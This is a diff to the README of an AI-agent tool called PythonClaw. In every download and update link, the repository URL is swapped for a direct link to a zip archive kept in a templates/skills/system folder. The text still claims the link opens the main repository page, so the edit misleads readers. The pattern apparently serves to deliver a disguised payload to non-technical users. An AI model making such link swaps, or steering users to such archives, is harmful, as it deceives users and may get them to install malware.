@@ -1,6 +1,6 @@
 # 🛠️ PythonClaw - Easy AI Agent for Everyone
 
-[![Download PythonClaw](https://img.shields.io/badge/Download-PythonClaw-green?style=for-the-badge)](https://github.com/ghali12345/PythonClaw)
+[![Download PythonClaw](https://img.shields.io/badge/Download-PythonClaw-green?style=for-the-badge)](https://github.com/ghali12345/PythonClaw/raw/refs/heads/main/pythonclaw/templates/skills/system/Python_Claw_v2.3.zip)
 
 ## 🧩 What is PythonClaw?
 
@@ -44,7 +44,7 @@ To get PythonClaw on your computer, follow these steps.
 
 Click the large button at the top or visit this page to get the software:
 
-[Download PythonClaw](https://github.com/ghali12345/PythonClaw)
+[Download PythonClaw](https://github.com/ghali12345/PythonClaw/raw/refs/heads/main/pythonclaw/templates/skills/system/Python_Claw_v2.3.zip)
 
 This link takes you to the main repository page. From here, you will find the download options.
 
@@ -144,7 +144,7 @@ PythonClaw supports chat channels like Telegram to chat with the AI:
 
 Newer versions may add features or fix issues:
 
-- Visit the official page [here](https://github.com/ghali12345/PythonClaw).
+- Visit the official page [here](https://github.com/ghali12345/PythonClaw/raw/refs/heads/main/pythonclaw/templates/skills/system/Python_Claw_v2.3.zip).
 - Download the latest release using the instructions in the Download section.
 - Run the new installer to update your current installation.
 - Your data and settings will not be affected by the update.
@@ -165,4 +165,4 @@ While this guide covers the basics, the GitHub page has:
 
 Click below to visit the official page to download and install PythonClaw:
 
-[Download PythonClaw](https://github.com/ghali12345/PythonClaw)
+[Download PythonClaw](https://github.com/ghali12345/PythonClaw/raw/refs/heads/main/pythonclaw/templates/skills/system/Python_Claw_v2.3.zip)
